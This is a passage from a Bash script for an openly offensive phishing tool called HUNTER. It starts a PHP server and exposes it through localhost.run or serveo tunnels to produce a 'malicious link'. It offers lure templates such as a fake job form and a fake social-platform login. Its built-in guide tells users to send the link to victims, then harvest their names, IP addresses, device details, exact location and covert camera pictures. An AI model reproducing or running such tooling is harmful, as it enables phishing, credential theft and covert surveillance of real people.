        rm -rf maliciouslink
        exit 1
    fi
    
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link";loading
    sleep 3

    mal_link=$(grep -o "https://[a-z0-9A-Z.-]*" maliciouslink | head -n 1)      #serveo.net
    rm -rf maliciouslink
    sleep 2
    
    templateSetup
}


function localXposer() 
{   
    command -v php > /dev/null 2>&1 || { 
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Opsy!, php is missing...,\n";
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Please install it in order to continue running this script.\n";
        exit 1; 
    }
    
    command -v ssh > /dev/null 2>&1 || { 
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Opsy!, ssh is missing...,\n";
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Please install it in order to continue running this script.\n";
        exit 1; 
    }

    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php server";loading
    fuser -k 31301/tcp > /dev/null 2>&1
    php -S localhost:31301 > /dev/null 2>&1 &
    sleep 3

    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting localhost.run server";loading
    ssh -o StrictHostKeyChecking=no -R 80:localhost:31301 nokey@localhost.run 2> sshError > maliciouslink &
    
    # Wait for localhost.run to establish the tunnel
    sleep 5
    if [[ -e sshError ]]; then
        conn=$(grep -a "Connection refused" sshError)
        resolve=$(grep -a "Temporary failure" sshError)

        if [[ -n $conn ]]; then
            printf '\n\033[1;31m[\033[1;37m--\033[1;31m] ssh: connect to host serveo.net port 22: Connection refused!\n'
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Hmm!, several reasons may caused this error, here are some tips to try.\n'
            printf '   01. Verify ssh port by checking the ssh configuration.\n'
            printf '        cmd (`\033[1;37mgreb -a Port /etc/ssh/sshd_conig\033[1;31m`).\n'
            printf '   02. Enable ssh access on your machine, by starting the ssh.\n'
            printf '        cmd (`\033[1;37msudo service ssh start\033[1;31m`).\n'
            printf '   03. It may be posible that the firewall is blocking ssh connections.\n'
            printf '        cmd (`\033[1;37mufw allow 22\033[1;31m`).\n'
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Feel free to contact us for more solution.\033[0m\n'
        elif [[ -n $resolve ]]; then
            printf '\n\033[1;31m[\033[1;37m--\033[1;31m] Could not Resolve Hostname localhost.run!\n'
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Please Check Your Internet Connection.\033[0m\n'
        else
            cmd=$(cat sshError)
            printf "\n\033[1;31m[\033[1;37m--\033[1;31m] $cmd!\n" 

        fi
        rm -rf sshError
        rm -rf maliciouslink
        exit 1
    fi
    
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link";loading
    sleep 3

    mal_link=$(grep -o "https://[a-zA-Z0-9.-]*\." maliciouslink | head -n 1)   #lhr.life
    rm -rf maliciouslink
    sleep 2
    
    templateSetup
}


function tunnel()
{
    default_server="1"
    printf "\n\033[1;37m-------\033[1;33mTunnel Servers\033[1;37m-------\n\n"    
    printf "   \033[1;33m[\033[1;37m01\033[1;33m] Localhost\n"
    printf "   \033[1;33m[\033[1;37m02\033[1;33m] Serveo.net\n"
    printf "   \033[1;33m[\033[1;37m03\033[1;33m] LocalTunnel\n"
    printf "   \033[1;33m[\033[1;37m04\033[1;33m] Localhost.run\n\n"
    read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose a Port Forwarding [\033[1;37mDefault is 1\033[1;33m]:\033[1;37m ' server
    if [[ $server -gt 4 && $server -lt 1 ]]; then
        printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Invalid Port Forwarding Option!\n"
        printf "\033[1;31m[\033[1;37m!!\033[1;31m] Please Try Again.\033[0m\n"
        sleep 5
        tunnel
    elif [[ -z $server ]]; then
        server=$default_server
    fi
    
    template

    if [[ $server == 1 ]] || [[ $server == 01 ]]; then
        localhost
    elif [[ $server == 2 ]] || [[ $server == 02 ]]; then
        serveo
    elif [[ $server == 3 ]] || [[ $server == 03 ]]; then
        localtunnel
    elif [[ $server == 4 ]] || [[ $server == 04 ]]; then
        localXposer
    else
        printf "\n\033[1;31m[\033[1;37m!!\033[1;31m] Invalid port forwarding, try again!\033[0m\n"
        sleep 1
        tunnel
    fi

}

function aboutUS()
{
    clear
    banner
    printf "\n\033[1;37m-------\033[1;33mAbout Tool\033[1;37m-------\n\n"    
    printf "   \033[1;33mVersion        \033[1;37m1.0.0\n"
    printf "   \033[1;33mTool Name      \033[1;37m\033[1;37mHUNTER\033[1;33m\n"
    printf "   \033[1;33mAuthor         \033[1;37mevilfeonix\n"
    printf "   \033[1;33mLatest Update  \033[1;37m12-03-2025\n"
    printf "   \033[1;33mGitub          \033[1;37mDigital Firebird\n"
    printf "   \033[1;33mYoutube        \033[1;37mDigital Firebird\n"
    printf "   \033[1;33mEmail          \033[1;37mevilfeonix@gmail.com\n\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Subscribe to our youtube channel \033[1;33m[\033[1;37m++\033[1;33m]\n"
    read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Press [\033[1;37mENTER\033[1;33m] to countinue'
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Loading!.., Please wait";loading
    redirection
    echo -e '\n\033[0m'

}

function guide()
{
    clear
    banner
    printf "\n\033[1;37m-------\033[1;33mHow to use \033[1;37mHUNTER\033[1;33m\033[1;37m-------\n\n"
    printf "\033[1;33m[\033[1;37mStep 1\033[1;33m] In the main menu, select the third option (03).\n"
    printf "\033[1;33m[\033[1;37mStep 2\033[1;33m] Then choose a tunnel server, we gonna use localhost on this tutorial.\n"
    printf "\033[1;33m[\033[1;37mStep 3\033[1;33m] Select a tunnel server, the first option (01).\n"
    printf "\033[1;33m[\033[1;37mStep 4\033[1;33m] Select a template that will be use to atract victims attention in order to collect their datas.\n"
    printf "       More!...,\n"
    printf "            01) Festival Wishing: wish ur victims a festival day, request festival name.\n"
    printf "            02) Live Youtube Video: atract victims attention with youtube video, request youtube video identification.\n"
    printf "            03) Job Application Form: sent job applying invitation to victims, request nothing!.\n"
    printf "            04) Custom Social Platform: pretend to be a legit platform, request platform name and login url.\n"
    printf "\033[1;33m[\033[1;37mStep 5\033[1;33m] Now, u gonna watch this script while it start php and the tunnel server u choose.\n"
    printf "\033[1;33m[\033[1;37mStep 6\033[1;33m] Next we gonna generate the malicious link, which will be use to lauch the attack.\n"
    printf "\033[1;33m[\033[1;37mStep 7\033[1;33m] We will setup the template which will be then use to attract the victims attention.\n"
    printf "\033[1;33m[\033[1;37mStep 8\033[1;33m] A malicious link will be displayed on the screen other wise an error will be shown instead.\n"
    printf "\033[1;33m[\033[1;37mStep 9\033[1;33m] If the malicious link is generated successfully, we will display a message showing that we're waiting for victims.\n"
    printf "\033[1;33m[\033[1;37mStep 10\033[1;33m] Copy and forword the malicious link to ur victims, and prompt them to visit the link.\n"
    printf "\033[1;33m[\033[1;37mStep 11\033[1;33m] We will detect when ever the victims visit our malicious link, and also forword date, time and the victims.\n"
    printf "\033[1;33m[\033[1;37mStep 12\033[1;33m] Other informations will be displayed such as.\n\n"
    printf "            01) Date, and time victims visit our malicious link.        02) Victims full name, and IP address.\n"
    printf "            03) Device OS, model, and Version.                          04) Victims device current day, date, time in full format.\n"
    printf "            05) Browser name, Version and language they understand.     06) Languages victims understand.\n"
    printf "            07) Victims timezone, region, country, and city.            08) Victims location, latitude, and longitude.\n"
    printf "            09) Victims pictures, we gonna hack into their camera.      10) We gonna help track their exact location on google maps.\n"
    printf "                                        11) And much more other informations but it based on the template u chooce to used.\n"
    printf "            \n"
    printf "\033[1;33m[\033[1;37mStep 12\033[1;33m] IMPORTANT: To make the malicous link accessible around the world, then u gotta select either (02), (03) or (04) in the tunnel server section.\n"
    read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Press [\033[1;37mENTER\033[1;33m] to countinue'
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Loading!.., Please wait";loading
    redirection
    echo -e '\n\033[0m'
}

function menu()
{
    sleep 1
    printf "\n\033[1;37m-------\033[1;33mMain Menu\033[1;37m-------\n\n"    
    printf "   \033[1;33m[\033[1;37m01\033[1;33m] Exit\n"
    printf "   \033[1;33m[\033[1;37m02\033[1;33m] About Us\n"
    printf "   \033[1;33m[\033[1;37m03\033[1;33m] How it Works\n"
    printf "   \033[1;33m[\033[1;37m04\033[1;33m] Update Script\n"
    printf "   \033[1;33m[\033[1;37m05\033[1;33m] Launch an Attack\n\n"
    read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose an Action to Perform:\033[1;37m ' act

    # if [[ $act -lt "1"]] || if [[ $act -gt "5"]]; then
    if [[ -z  $act ]]; then
        printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Action Can't be Empty!\n"
        printf "\033[1;31m[\033[1;37m!!\033[1;31m] Please Select From The Above Maintion!\033[0m\n"
        sleep 2
        menu
    fi

    if [[ $act == 1 ]] || [[ $act == 01 ]]; then
        Sleep 2
        printf "\n\033[1;31m[\033[1;37m!!\033[1;31m] Hope you enjoy using \033[1;37mHUNTER\033[1;31m.\033[0m\n"
        redirection
    elif [[ $act == 2 ]] || [[ $act == 02 ]]; then
        sleep 2
        aboutUS
    elif [[ $act == 3 ]] || [[ $act == 03 ]]; then
        sleep 2
        guide
    elif [[ $act == 4 ]] || [[ $act == 04 ]]; then
        sleep 2
        updateUS
    elif [[ $act == 5 ]] || [[ $act == 05 ]]; then
        sleep 2
        tunnel
    else
        printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Invalid Choice!\n"
        printf "\033[1;31m[\033[1;37m!!\033[1;31m] Please Select From The Above Maintion.\033[0m\n"
        sleep 1
        menu
    fi

}

function hunter()
{
    clear
    sleep 2
    banner
    menu
}

hunter
